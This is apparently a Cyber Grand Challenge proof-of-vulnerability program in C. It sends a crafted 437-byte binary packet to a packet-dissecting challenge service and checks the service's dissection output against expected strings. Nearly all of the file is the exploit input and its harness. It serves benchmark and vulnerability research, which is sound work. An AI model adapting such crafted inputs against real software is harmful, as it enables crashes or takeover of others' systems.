#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xb5\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x9d\x01\x00\x00\x95\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x95\x01\x00\x00"
         "\x14\xd4\x8d\x4b\x61\x51\x3e\xfc\xe7\xa1\xa3\xc3\x77\xac\xf6\xc5"
         "\x5e\xea\x3e\x53\x33\x00\x00\x00\x47\xd4\x41\x00\x41\x00\xff\x33"
         "\x08\x69\x7f\x06\x31\x40\x86\x19\x34\x35\xfd\x4e\x99\x62\x69\xf4"
         "\xb0\xca\x40\x33\xf9\xec\x52\x8b\x67\x32\x99\x11\x22\xc5\x2f\xc6"
         "\xd3\x2e\x02\xcc\x92\x57\xd0\xcb\x50\x10\x49\xdb\x45\x75\x26\xc9"
         "\x9d\x1b\x26\x42\x97\x7e\x9f\x74\x14\xa2\xff\x88\xc1\x23\xcf\x3a"
         "\x0b\xb8\x13\x1a\x2a\xfe\xc8\x3d\xe1\x71\x16\x9a\xdb\x86\x46\xe4"
         "\x42\x89\x89\x56\x18\x8d\x85\xda\xfa\x43\xc1\x82\xc9\x93\xca\xea"
         "\xca\x0f\x06\x45\x6d\xab\xc4\x9e\x51\xc0\x19\x89\xa0\x5c\x9e\x5e"
         "\x72\xe2\xe0\xd0\xfe\x62\x53\x00\x08\x49\x34\x41\x2e\xa2\x07\x25"
         "\x09\x9e\x64\xa7\x97\xc5\xf2\x67\xcd\xcc\x66\x00\xa0\x54\x8c\xc1"
         "\xda\x8c\xb2\xc4\x82\x31\x45\x8b\x49\xf3\xd1\x91\x05\xb6\x49\x72"
         "\x4e\x0b\x11\x68\x48\x04\x69\x38\xb6\xc8\x1f\x20\x2f\x2a\xf2\xf1"
         "\xb0\x4e\x6e\x8e\x10\xcc\x55\x5a\xaf\x35\x39\x36\x4a\x67\x24\x54"
         "\x3d\x3d\x32\x4f\x03\x96\x8f\x8f\x9d\x82\x1e\xca\x35\xef\x2d\x50"
         "\x8b\x43\x76\xbc\x6c\x5e\xed\xe6\xee\x7d\x0e\x47\xe6\x2e\x73\xd8"
         "\x69\x90\x44\x1f\xdb\xda\x71\x79\x36\x07\x36\xdf\x37\x65\xd9\x87"
         "\x16\x15\x21\xe0\xb7\x8f\x89\x5f\xaa\xd1\x6b\xdf\x99\x40\x6a\x20"
         "\x7a\xd0\x01\x0e\x16\x5a\x34\x6a\x01\xd9\x91\x57\xb0\xf4\xd8\x9a"
         "\x3b\x62\x41\x00\x5e\x95\xa5\x89\x8e\x5c\xf6\x40\x14\x90\x5d\xde"
         "\xd4\xe4\x84\x91\xfb\xe1\x62\x77\x41\x00\xb8\x4d\x70\x3f\xcc\x3a"
         "\xfc\xe2\xd3\xbf\x9b\x3d\x8e\x01\x00\xc5\xcc\x94\x63\xdc\x03\x06"
         "\x41\x00\x41\x00\x36\x5e\x7e\x71\xac\x61\x87\x50\xb8\x66\xfe\x12"
         "\x62\x0e\x66\x01\xd4\x01\x26\x3a\x28\x48\x76\xc5\xd4\xb0\x6c\x01"
         "\x00\xdc\x0a\xc0\xc0\x7f\x93\xe4\x80\xc1\x41\x00\xd8\x79\x01\x00"
         "\x19\x5f\xd5\x46\x14";
      static unsigned int write_00001_00000_len = 437;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamapolitician
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x70\x6f\x6c\x69\x74\x69"
         "\x63\x69\x61\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
